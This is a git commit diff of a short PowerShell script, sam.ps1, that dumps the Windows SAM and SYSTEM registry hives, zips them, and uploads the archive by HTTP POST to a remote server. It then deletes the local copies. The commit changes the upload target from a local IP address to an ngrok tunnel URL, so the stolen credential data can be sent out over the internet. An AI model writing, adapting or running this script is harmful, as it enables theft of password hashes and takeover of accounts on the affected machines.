fe3d4fab62b3a2bff0054e73da2a958be2cf357c
Lex <104235290+VBV11@users.noreply.github.com>
2026-07-02 12:36:18 +0200

    Change upload URL in PowerShell script

--- sam.ps1
+++ sam.ps1
@@ -2,7 +2,7 @@ reg save hklm\sam sam;
 reg save hklm\system sys;
 Compress-Archive -Path "$PWD\sys", "$PWD\sam" -DestinationPath "C:\WINDOWS\system32\dump.zip" -Force;
 $file = [IO.File]::ReadAllBytes("C:\WINDOWS\system32\dump.zip");
-iwr "http://192.168.1.150:8000" -Method POST -Body $file -UseBasicParsing;
+iwr "https://monorail-moonlike-afoot.ngrok-free.dev/" -Method POST -Body $file -UseBasicParsing;
 remove-item sys;
 remove-item sam;
 exit
